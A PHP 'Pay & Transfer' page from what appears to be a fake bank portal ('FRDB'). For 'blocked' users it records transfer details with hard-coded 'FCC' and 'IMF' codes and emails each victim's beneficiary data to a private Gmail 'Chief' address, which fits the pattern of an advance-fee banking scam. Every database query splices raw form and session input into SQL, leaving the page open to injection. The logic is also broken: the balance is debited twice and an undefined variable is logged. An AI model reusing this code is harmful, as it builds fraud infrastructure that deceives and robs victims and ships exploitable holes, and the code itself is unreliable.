<?php include 'includes/timeoutable.php' ?>
<?php include 'includes/db.php'; ?>
<?php
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) { //ALL CODE RUNS INSIDE THIS IF A USER IS LOGGED IN
    //  header('Location: panel.php');


} else { //IF NO USER LOGGED IN
    echo "<script type='text/javascript'> document.location = 'index.php'; </script>";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay & Transfer</title>
</head>

<?php

$date = date('Y-m-d H:i:s');

//INVENTOR SUBMIT

if(isset($_POST['int_submit'])) {
    $name = $_SESSION['name'];

    $bank_name = $_POST['bank_name'];
    $_SESSION['bank_name'] = $_POST['bank_name'];

    $b_name = $_POST['b_name'];
    $_SESSION['b_name'] = $_POST['b_name'];

    $refrence = $_POST['refrence'];

    $b_acct = $_POST['b_acct'];

    $b_country = $_POST['b_country'];

    $swift_code = $_POST['swift_code'];

    $routing_number = $_POST['routing_number'];

    $description = $_POST['description'];

    $acct_type = $_POST['acct_type'];

    $amount = $_POST['amount'];
    $_SESSION['debited_amount'] = $_POST['amount'];

    $s_code = 'FCC00851423';

    $imf = 'TCC61084139';

    $inter_sql = "SELECT * FROM users WHERE id ='$_SESSION[id]'";

    $inter_q = mysqli_query($conn, $inter_sql);

    while($rows = mysqli_fetch_assoc($inter_q)) {

        $d_amount = $rows['amount'];

        if($amount > $d_amount || $amount < 1) {
            echo "<script type='text/javascript'> document.location = 'pay-and-transfer.php?insufficient_balance'; </script>";
        }
        if($rows['limit_status'] == "restricted") {
            echo "<script type='text/javascript'> document.location = 'pay-and-transfer.php?limit_exceeded'; </script>";
        }
    }

    $inter_sql = "SELECT * FROM blocked WHERE user_id ='$_SESSION[id]'";
    $inter_q = mysqli_query($conn, $inter_sql);
    if(mysqli_num_rows($inter_q) > 0) {
        $inter_sql = "SELECT * FROM int_transfer WHERE user_id ='$_SESSION[id]'";
        $inter_q = mysqli_query($conn, $inter_sql);
        if(mysqli_num_rows($inter_q) > 0) {
            $sql = "UPDATE int_transfer SET bank_name='$bank_name', amount='$amount', b_name='$b_name', b_acct='$b_acct', b_country='$b_country', swift_code='$swift_code', routing_number='$routing_number', description='$description', imf='$imf', refrence='$refrence'  WHERE user_id = '$_SESSION[id]'";
            $sql_q = mysqli_query($conn, $sql);
            $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS
            $result1 = mysqli_query($conn, $sql);
            //TO SEND EMAIL Admin begins
            while($rows = mysqli_fetch_assoc($result1)) {
                $c_id = $rows['user_id'];
                $name = $_SESSION['name'];
                $b_name = $rows['b_name'];
                $refrence = $rows['refrence'];
                $b_account = $rows['b_acct'];
                $b_country = $rows['b_country'];
                $swift_code = $rows['swift_code'];
                $b_routing = $rows['routing_number'];
                $b_bank = $rows['bank_name'];
                $b_acct_type = $rows['acct_type'];
                $amount = $rows['amount'];
                $name1 = "Chief";
                $to = "bludarymulti.resourc@gmail.com"; // this is your Email address
                $from = "info@myfrdb.com"; // this is the sender's Email address
                $subject2 = "Client | Activities";
                $message2 = "Hello " . $name1 .",
                " . $name." is trying to enter his/her FCC code, find Details below:
                Customer ID : " . $c_id . "
                Client Name: " . $name."
                Beneficiary Name: " .$b_name."
                Beneficiary Account: ".$b_acct_type."
                Swiftcode: ".$swift_code."
                Routing Number: ".$b_routing ."
                Beneficiary Bank: ".$b_bank ."
                Beneficiary Account Number: ".$b_account ."
                Amount: ".$amount ."
                Ben Country Code: ".$b_country ."
                ";
                $headers = "From:" . $from;
                mail($to, $subject2, $message2, $headers);
            }  // sends a copy of the message to the sender
            //TO SEND EMAIL ENDS
            echo "<script type='text/javascript'> document.location = 'confirm_payment.php?updated_successfuly'; </script>";
        } else {
            $ins_sql1 = "INSERT INTO int_transfer (bank_name, b_name, user_id, b_acct, b_country, swift_code, routing_number, acct_type, amount, code, description, imf, refrence) VALUES ('$bank_name', '$b_name', '$_SESSION[id]', '$b_acct', '$b_country', '$swift_code', '$routing_number', '$acct_type', '$amount', '$s_code', '$description', '$imf', $refrence)";
            $run_sql2 = mysqli_query($conn, $ins_sql1);
            $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS
            $result1 = mysqli_query($conn, $sql);
            //TO SEND EMAIL Admin begins
            while($rows = mysqli_fetch_assoc($result1)) {
                $c_id = $rows['user_id'];
                $name = $_SESSION['name'];
                $b_name = $rows['b_name'];
                $b_account = $rows['b_acct'];
                $b_country = $rows['b_country'];
                $swift_code = $rows['swift_code'];
                $b_routing = $rows['routing_number'];
                $b_bank = $rows['bank_name'];
                $b_acct_type = $rows['acct_type'];
                $amount = $rows['amount'];
                $name1 = "Chief";
                $to = "bludarymulti.resourc@gmail.com"; // this is your Email address
                $from = "info@myfrdb.com"; // this is the sender's Email address
                $subject2 = "Client | Activities";
                $message2 = "Hello " . $name1 .",
            " . $name." is trying to enter his/her FCC code, find Details below:
                Customer ID : " . $c_id . "
                Client Name: " . $name."
                Beneficiary Name: " .$b_name."
                Beneficiary Account: ".$b_acct_type."
                Swiftcode: ".$swift_code."
                Routing Number: ".$b_routing ."
                Beneficiary Bank: ".$b_bank ."
                Beneficiary Account Number: ".$b_account ."
                Amount: ".$amount ."
                Ben Country Code: ".$b_country ."
                ";
                $headers = "From:" . $from;
                mail($to, $subject2, $message2, $headers);
            }  // sends a copy of the message to the sender
            //TO SEND EMAIL ENDS
            echo "<script type='text/javascript'> document.location = 'confirm_payment.php?insertsuccess'; </script>";
        }
    } else {
        $sql2 = "SELECT * FROM users WHERE id = '$_SESSION[id]'";
        $sql_qq = mysqli_query($conn, $sql2);
        while ($rows = mysqli_fetch_assoc($sql_qq)) {
            $accBalance = $rows['amount'];
            $email = $rows['email'];
            $name = $rows['name'];
            $amount2 = $accBalance-=$amount;
            $currency = $rows['currency'];
            $date2 = $date;
            $act_no = $rows['act_no'];
            $newact = substr_replace($act_no, '*****', 6, 4);
            $account = $rows['account'];
            $newAmount = $accBalance - $amount;
        }
        $upd_sql = "UPDATE users SET  amount='$newAmount', am_updated= '$date' WHERE id = '$_SESSION[id]'";
        $run_sql = mysqli_query($conn, $upd_sql);

        $to = $email; // this is your Email address
        $from = "no-reply@myfrdb.com"; // this is the sender's Email address
        $first_name = $name;
           
        $subject2 = "FRDB Transaction Notification [Debit: ".$currency . $amount . "]";
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        $message = '<html><body>';
        $message = '<div class="navbar-brand"  style="text-align: center; background-color: green" href=""><img src="https://i.ibb.co/LRSjYX8/logo-200x45.png" alt="FRDB" class="logo">';
        $message .= '<div  style="background-color: white;">';
        $message .= '<h3 style="text-align: left;">Dear '. $first_name . '</h3>';
        $message .= "<h4 style='color:#071d49;'>Your account has been Debited
                </4>";
        $message .= '<div style="text-align: center;">';
        $message .= '<h1 style="color: red; font-size:18px;">' .$currency .$amount.'.00</h1>';
        $message .= '<h3>Transaction Summary</h3>';
        $message .= '<p><b>IBAN:</b> '.$newact.'</p><b>Account type:</b></p> '.$account.'<p><b>Account Name:</b> '. $name .'</p>';
        $message .= '<p><b>Transaction Branch:</b> Head Office</p><p><b>Transaction Date:</b> ' .$date2.'</p>';
        $message .= '<p><b>Transaction Amount:</b> '.$currency .$amount.'.00</p>';
        $message .= '<p><b>Description:</b> '.$description.'</p>';
        $message .= '<p><b>Available Balance:</b> ' .$currency . $newAmount .'.00</p>';
        $message .= '</div>';
        $message .= '<h4>Your balance at the time of this transaction is <strong>' .$currency . $newAmount .'.00</strong> Thank you for chosing FRDBank</h4>';
        $message .= '<div style="background-color: #28a745; color: white; text-align: center"><a href="https://www.myfrdb.com">FRDB!</a> Always giving you extra.</div>';
        $message .= '</div></div></body></html>';
        $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
        mail($to, $subject2, $message, $headers);

        $sel_sql = "SELECT * FROM users WHERE  id = '$_SESSION[id]'";
        $sql = mysqli_query($conn, $sel_sql);
        while($rows = mysqli_fetch_assoc($sql)) {
            //so get the user details you want to save here
            $name = $rows['name'];
            $d_amount = $rows['amount'];
            $amount2 = $newAmount;
            $email = $rows['email'];
            $currency = $rows['currency'];
            $date2 = $date;
            $act_no = $rows['act_no'];
            $newact = substr_replace($act_no, '*****', 6, 4);
            $account = $rows['account'];
            $debittedAmount = $_POST['amount'];
            //etc etc etc.......
        }

        $sel_sql1 = "SELECT * FROM transaction WHERE id = '$_SESSION[id]'";
        $sql1 = mysqli_query($conn, $sel_sql1);
        if(mysqli_num_rows($sql1) >= 0) {
            $ins_sql = "INSERT INTO transaction (name, transaction, amount, description, user_id, created_at, status) VALUES ('$name', 'Debit', '$currency$debittedAmount', '$details', '$_SESSION[id]', '$date', 'Successful')";
            $run_sql = mysqli_query($conn, $ins_sql);
        }
        echo "<script type='text/javascript'> document.location = 'panel.php?successfull'; </script>";
    }
} else {
    //echo 'sorry! One or more fields are empty';
}
?>

<body>

    <?php include('header2.php') ?>
    <div style="height:60px;"></div>
    <div class="main-wrapper">
        <div class="container">
            <div class="row">
                <div class="top-bar"
                    style="margin-top: 30px; padding: 7px 12px; display: flex; align-items: center; gap: 50px; background-color: rgba(100, 100, 130, 0.9); color: white;">
                    <p style="margin-right: 70px">MOVE MONEY</p>
                    <p style="padding-left: 10px">PAY AND TRANSFER</p>
                </div>
                <div class="" style="display: flex;">
                    <div class="col-5" style="width: 20%; background-color: rgba(100, 100, 100, 0.2);">
                        <div
                            style="background-color: white; padding: 10px; box-shadow: 0px 1px 4px grey; border-left: 4px solid red;">
                            <p>Pay and transfer</p>
                        </div>
                    </div>
                    <div class="col-7">
                        <div style="border-top: 3px solid red; width: 30%; padding-top: 0px">
                        </div>
                        <?php    if(isset($_GET['insufficient_balance'])) {

                            echo'<div class="alert alert-danger text-center">

                            <strong>Insufficient balance</strong></div><br>';

                        } ?>
                        <?php    if(isset($_GET['limit_exceeded'])) {
                            echo'<div class="alert alert-danger text-center">
<strong>Treansfer limit exceeded</strong></div><br>';
                        } ?>
                        <div class="di" style="padding-left: 10px; padding-right: 10px; padding-bottom: 10px;">
                            <h2>New payments and transfers</h2>
                            <p style="font-weight: bold; font-size: 13px; padding-top: 10px">From here you can move
                                money between your accounts or to another person's account, whether at home or overseas.
                                you can also send money to companies</p>
                            <h3>From</h3>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1">Account type</label>
                                <div class="controls col-md-8" style="flex-grow: 1">
                                    <form method="post" action="pay-and-transfer.php" id="myform">
                                        <select name="acct_type" id="acct_type" class="form-control">
                                            <option value="saving" selected>
                                                <div
                                                    style="display: flex; align-items: center; justify-content: space-between">
                                                    <p><?php echo $_SESSION['account'] ?>
                                                    </p>
                                                    <p>(<?php echo $_SESSION['currency'] ?><?php echo $_SESSION['amount'] ?>)
                                                    </p>
                                                </div>
                                            </option>

                                        </select>
                                </div>
                                <hr>
                            </div>
                            <h3>To</h3>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1">Transfer type</label>
                                <div class="controls col-md-8" style="flex-grow: 1">
                                    <select name="acct_type" id="acct_type" class="form-control" required>

                                        <option value="saving" selected>Please select</option>

                                        <option value="current">Non-HSBC</option>

                                        <option value="checking">Overseas</option>
                                    </select>
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1"> Payee name</label>
                                <div class="controls col-md-8 ">
                                    <input class="input-md textinput textInput form-control" id="b_name" name="b_name"
                                        placeholder="name" style="margin-bottom: 10px" type="text" required />
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1"> Bank name</label>
                                <div class="controls col-md-8" style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="bank_name"
                                        name="bank_name" placeholder="Bank name" style="margin-bottom: 10px" type="text"
                                        required />
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1"> Account
                                    number</label>
                                <div class="controls col-md-8" style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="amount" name="b_acct"
                                        placeholder="Account number" style="margin-bottom: 10px" type="text" required />
                                </div>
                                <hr>
                            </div>
                            <hr>
                            <h3>Details</h3>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1"> Country</label>
                                <div class="controls col-md-8" style="flex-grow: 1">
                                    <select name="b_country" id="state" class="form-control selectpicker countrypicker"
                                        data-flag="true" required>
                                        <option value="Afghanistan">Afghanistan</option>

                                        <option value="Albania">Albania</option>

                                        <option value="Algeria">Algeria</option>

                                        <option value="as">American Samoa</option>

                                        <option value="American Samoa">Andorra</option>

                                        <option value="Angola">Angola</option>

                                        <option value="Anguilla">Anguilla</option>

                                        <option value="Antarctica">Antarctica</option>

                                        <option value="Antigua_and_Barbuda">Antigua and Barbuda</option>

                                        <option value="Argentina">Argentina</option>

                                        <option value="Armenia">Armenia</option>

                                        <option value="Aruba">Aruba</option>

                                        <option value="Australia">Australia</option>

                                        <option value="Austria">Austria</option>

                                        <option value="Azerbaijan">Azerbaijan</option>

                                        <option value="Bahamas">Bahamas</option>

                                        <option value="Bahrain">Bahrain</option>

                                        <option value="Bangladesh">Bangladesh</option>

                                        <option value="Barbados">Barbados</option>

                                        <option value="Belarus">Belarus</option>

                                        <option value="Belgium">Belgium</option>

                                        <option value="Belize">Belize</option>

                                        <option value="Benin">Benin</option>

                                        <option value="Bermuda">Bermuda</option>

                                        <option value="Bhutan">Bhutan</option>

                                        <option value="Bolivia">Bolivia</option>

                                        <option value="Bonaire">Bonaire</option>

                                        <option value="Bosnia_and_Herzegovina">Bosnia and Herzegovina</option>

                                        <option value="Botswana">Botswana</option>

                                        <option value="Bouvet_Island">Bouvet Island</option>

                                        <option value="Brazil">Brazil</option>

                                        <option value="British_Indian_Ocean_Territory">British Indian Ocean
                                            Territory</option>

                                        <option value="British Virgin Islands">British Virgin Islands</option>

                                        <option value="Brunei">Brunei</option>

                                        <option value="Bulgaria">Bulgaria</option>

                                        <option value="Burkina Faso">Burkina Faso</option>

                                        <option value="Burundi">Burundi</option>

                                        <option value="Cambodia">Cambodia</option>

                                        <option value="Cameroon">Cameroon</option>

                                        <option value="Canada">Canada</option>

                                        <option value="Cape Verde">Cape Verde</option>

                                        <option value="Cayman Islands">Cayman Islands</option>

                                        <option value="Central African Republic">Central African Republic
                                        </option>

                                        <option value="Chad">Chad</option>

                                        <option value="chile">Chile</option>

                                        <option value="china">China</option>

                                        <option value="Christmas Island">Christmas Island</option>

                                        <option value="Cocos [Keeling] Islands">Cocos [Keeling] Islands</option>

                                        <option value="co">Colombia</option>

                                        <option value="km">Comoros</option>

                                        <option value="ck">Cook Islands</option>

                                        <option value="cr">Costa Rica</option>

                                        <option value="hr">Croatia</option>

                                        <option value="cu">Cuba</option>

                                        <option value="cw">Curacao</option>

                                        <option value="cy">Cyprus</option>

                                        <option value="cz">Czech Republic</option>

                                        <option value="cd">Democratic Republic of the Congo</option>

                                        <option value="dk">Denmark</option>

                                        <option value="dj">Djibouti</option>

                                        <option value="dm">Dominica</option>

                                        <option value="do">Dominican Republic</option>

                                        <option value="tl">East Timor</option>

                                        <option value="ec">Ecuador</option>

                                        <option value="eg">Egypt</option>

                                        <option value="sv">El Salvador</option>

                                        <option value="gq">Equatorial Guinea</option>

                                        <option value="er">Eritrea</option>

                                        <option value="ee">Estonia</option>

                                        <option value="et">Ethiopia</option>

                                        <option value="fk">Falkland Islands</option>

                                        <option value="fo">Faroe Islands</option>

                                        <option value="fj">Fiji</option>

                                        <option value="fi">Finland</option>

                                        <option value="fr">France</option>

                                        <option value="gf">French Guiana</option>

                                        <option value="pf">French Polynesia</option>

                                        <option value="tf">French Southern Territories</option>

                                        <option value="ga">Gabon</option>

                                        <option value="gm">Gambia</option>

                                        <option value="ge">Georgia</option>

                                        <option value="de">Germany</option>

                                        <option value="gh">Ghana</option>

                                        <option value="gi">Gibraltar</option>

                                        <option value="gr">Greece</option>

                                        <option value="gl">Greenland</option>

                                        <option value="gd">Grenada</option>

                                        <option value="gp">Guadeloupe</option>

                                        <option value="gu">Guam</option>

                                        <option value="gt">Guatemala</option>

                                        <option value="gg">Guernsey</option>

                                        <option value="gn">Guinea</option>

                                        <option value="gw">Guinea-Bissau</option>

                                        <option value="gy">Guyana</option>

                                        <option value="ht">Haiti</option>

                                        <option value="hm">Heard Island and McDonald Islands</option>

                                        <option value="hn">Honduras</option>

                                        <option value="hk">Hong Kong</option>

                                        <option value="hu">Hungary</option>

                                        <option value="is">Iceland</option>

                                        <option value="in">India</option>

                                        <option value="id">Indonesia</option>

                                        <option value="ir">Iran</option>

                                        <option value="iq">Iraq</option>

                                        <option value="ie">Ireland</option>

                                        <option value="im">Isle of Man</option>

                                        <option value="il">Israel</option>

                                        <option value="it">Italy</option>

                                        <option value="ci">Ivory Coast</option>

                                        <option value="jm">Jamaica</option>

                                        <option value="jp">Japan</option>

                                        <option value="je">Jersey</option>

                                        <option value="jo">Jordan</option>

                                        <option value="kz">Kazakhstan</option>

                                        <option value="ke">Kenya</option>

                                        <option value="ki">Kiribati</option>

                                        <option value="xk">Kosovo</option>

                                        <option value="kw">Kuwait</option>

                                        <option value="kg">Kyrgyzstan</option>

                                        <option value="la">Laos</option>

                                        <option value="lv">Latvia</option>

                                        <option value="lb">Lebanon</option>

                                        <option value="ls">Lesotho</option>

                                        <option value="lr">Liberia</option>

                                        <option value="ly">Libya</option>

                                        <option value="li">Liechtenstein</option>

                                        <option value="lt">Lithuania</option>

                                        <option value="lu">Luxembourg</option>

                                        <option value="mo">Macao</option>

                                        <option value="mk">Macedonia</option>

                                        <option value="mg">Madagascar</option>

                                        <option value="mw">Malawi</option>

                                        <option value="my">Malaysia</option>

                                        <option value="mv">Maldives</option>

                                        <option value="ml">Mali</option>

                                        <option value="mt">Malta</option>

                                        <option value="mh">Marshall Islands</option>

                                        <option value="mq">Martinique</option>

                                        <option value="mr">Mauritania</option>

                                        <option value="mu">Mauritius</option>

                                        <option value="yt">Mayotte</option>

                                        <option value="mx">Mexico</option>

                                        <option value="fm">Micronesia</option>

                                        <option value="md">Moldova</option>

                                        <option value="mc">Monaco</option>

                                        <option value="mn">Mongolia</option>

                                        <option value="me">Montenegro</option>

                                        <option value="ms">Montserrat</option>

                                        <option value="ma">Morocco</option>

                                        <option value="mz">Mozambique</option>

                                        <option value="mm">Myanmar [Burma]</option>

                                        <option value="na">Namibia</option>

                                        <option value="nr">Nauru</option>

                                        <option value="np">Nepal</option>

                                        <option value="nl">Netherlands</option>

                                        <option value="nc">New Caledonia</option>

                                        <option value="nz">New Zealand</option>

                                        <option value="ni">Nicaragua</option>

                                        <option value="ne">Niger</option>

                                        <option value="ng">Nigeria</option>

                                        <option value="nu">Niue</option>

                                        <option value="nf">Norfolk Island</option>

                                        <option value="kp">North Korea</option>

                                        <option value="mp">Northern Mariana Islands</option>

                                        <option value="no">Norway</option>

                                        <option value="om">Oman</option>

                                        <option value="pk">Pakistan</option>

                                        <option value="pw">Palau</option>

                                        <option value="ps">Palestine</option>

                                        <option value="pa">Panama</option>

                                        <option value="pg">Papua New Guinea</option>

                                        <option value="py">Paraguay</option>

                                        <option value="pe">Peru</option>

                                        <option value="ph">Philippines</option>

                                        <option value="pn">Pitcairn Islands</option>

                                        <option value="pl">Poland</option>

                                        <option value="pt">Portugal</option>

                                        <option value="pr">Puerto Rico</option>

                                        <option value="qa">Qatar</option>

                                        <option value="cg">Republic of the Congo</option>

                                        <option value="ro">Romania</option>

                                        <option value="ru">Russia</option>

                                        <option value="rw">Rwanda</option>

                                        <option value="re">Réunion</option>

                                        <option value="bl">Saint Barthélemy</option>

                                        <option value="sh">Saint Helena</option>

                                        <option value="kn">Saint Kitts and Nevis</option>

                                        <option value="lc">Saint Lucia</option>

                                        <option value="mf">Saint Martin</option>

                                        <option value="pm">Saint Pierre and Miquelon</option>

                                        <option value="vc">Saint Vincent and the Grenadines</option>

                                        <option value="ws">Samoa</option>

                                        <option value="sm">San Marino</option>

                                        <option value="sa">Saudi Arabia</option>

                                        <option value="sn">Senegal</option>

                                        <option value="rs">Serbia</option>

                                        <option value="sc">Seychelles</option>

                                        <option value="sl">Sierra Leone</option>

                                        <option value="sg">Singapore</option>

                                        <option value="sx">Sint Maarten</option>

                                        <option value="sk">Slovakia</option>

                                        <option value="si">Slovenia</option>

                                        <option value="sb">Solomon Islands</option>

                                        <option value="so">Somalia</option>

                                        <option value="za">South Africa</option>

                                        <option value="gs">South Georgia and the South Sandwich Islands</option>

                                        <option value="kr">South Korea</option>

                                        <option value="ss">South Sudan</option>

                                        <option value="es">Spain</option>

                                        <option value="lk">Sri Lanka</option>

                                        <option value="sd">Sudan</option>

                                        <option value="sr">Suriname</option>

                                        <option value="sj">Svalbard and Jan Mayen</option>

                                        <option value="sz">Swaziland</option>

                                        <option value="se">Sweden</option>

                                        <option value="ch">Switzerland</option>

                                        <option value="sy">Syria</option>

                                        <option value="st">São Tomé and Príncipe</option>

                                        <option value="tw">Taiwan</option>

                                        <option value="tj">Tajikistan</option>

                                        <option value="tz">Tanzania</option>

                                        <option value="th">Thailand</option>

                                        <option value="tg">Togo</option>

                                        <option value="tk">Tokelau</option>

                                        <option value="to">Tonga</option>

                                        <option value="tt">Trinidad and Tobago</option>

                                        <option value="tn">Tunisia</option>

                                        <option value="tr">Turkey</option>

                                        <option value="tm">Turkmenistan</option>

                                        <option value="tc">Turks and Caicos Islands</option>

                                        <option value="tv">Tuvalu</option>

                                        <option value="um">U.S. Minor Outlying Islands</option>

                                        <option value="vi">U.S. Virgin Islands</option>

                                        <option value="ug">Uganda</option>

                                        <option value="ua">Ukraine</option>

                                        <option value="ae">United Arab Emirates</option>

                                        <option value="United kingdom">United Kingdom</option>

                                        <option value="United States" selected>United States</option>

                                        <option value="uy">Uruguay</option>

                                        <option value="uz">Uzbekistan</option>

                                        <option value="vu">Vanuatu</option>

                                        <option value="va">Vatican City</option>

                                        <option value="ve">Venezuela</option>

                                        <option value="vn">Vietnam</option>

                                        <option value="wf">Wallis and Futuna</option>

                                        <option value="eh">Western Sahara</option>

                                        <option value="ye">Yemen</option>

                                        <option value="zm">Zambia</option>

                                        <option value="zw">Zimbabwe</option>

                                        <option value="ax">Åland</option>
                                    </select>
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1"> Amount</label>
                                <div class="controls col-md-8 " style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="amount" name="amount"
                                        placeholder="Amount" style="margin-bottom: 10px" type="number" required />
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1">Swift code</label>
                                <div class="controls col-md-8 " style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="swift_code"
                                        name="swift_code" placeholder="Swift code" style="margin-bottom: 10px"
                                        type="number" required />
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1"> Routing
                                    number</label>
                                <div class="controls col-md-8 " style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="routing_number"
                                        name="routing_number" placeholder="Routing number" style="margin-bottom: 10px"
                                        type="number" required />
                                </div>
                                <hr>
                            </div>
                            <h3>Transfer method</h3>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="method" class="control-label col-lg-4  requiredField" style="flex-grow: 1">
                                    Method</label>
                                <div class="controls col-lg-8 " style="flex-grow: 1">
                                    <form method="post" action="pay-and-transfer.php">
                                        <select name="acct_type" id="method" class="form-control" required>
                                            <option value="saving" selected>
                                                <?php echo $_SESSION['account'] ?>
                                            </option>
                                            <option value="current">Current Account</option>
                                        </select>
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="id_company" class="control-label col-lg-4  requiredField"
                                    style="flex-grow: 1"> Payee
                                    Reference</label>
                                <div class="controls col-lg-8" style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="refrence"
                                        name="refrence" placeholder="refrence" style="margin-bottom: 10px" type="text"
                                        required />
                                </div>
                                <hr>
                            </div>
                            <div style="display: flex; align-items: center; justify-content: between; padding: 20px;">
                                <label for="payment_reason" class="control-label col-md-4  requiredField"
                                    style="flex-grow: 1">
                                    Reason for
                                    payment</label>
                                <div class="controls col-md-8 " style="flex-grow: 1">
                                    <input class="input-md textinput textInput form-control" id="reason-for-payment"
                                        name="description" placeholder="Reason for payment" style="margin-bottom: 10px"
                                        type="text" required />
                                </div>
                                <hr>
                            </div>
                            <hr>
                            <h2>important information</h2>
                            <div style="padding: 20px;">
                                <p>Your details will be uploaded in real time.</p>
                                <p>All correspondences including statements and marketing materials will be sent to the
                                    email address and contact number in the bank's records. To update your prefrences,
                                    please visit online banking </p>
                            </div>
                            <div style="text-align: end; margin: 10px; position: relative">
                                <button class="btn btn-sm btn-danger" form="myform" name="int_submit">Continue</button>
                                </form>
                                <button class="btn btn-sm btn-outline-light " onclick="handleCancel();"
                                    style="margin: 5px; position: absolute; right: 80px; bottom: -5px">Go back</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
<?php include("footer.php") ?>

</html>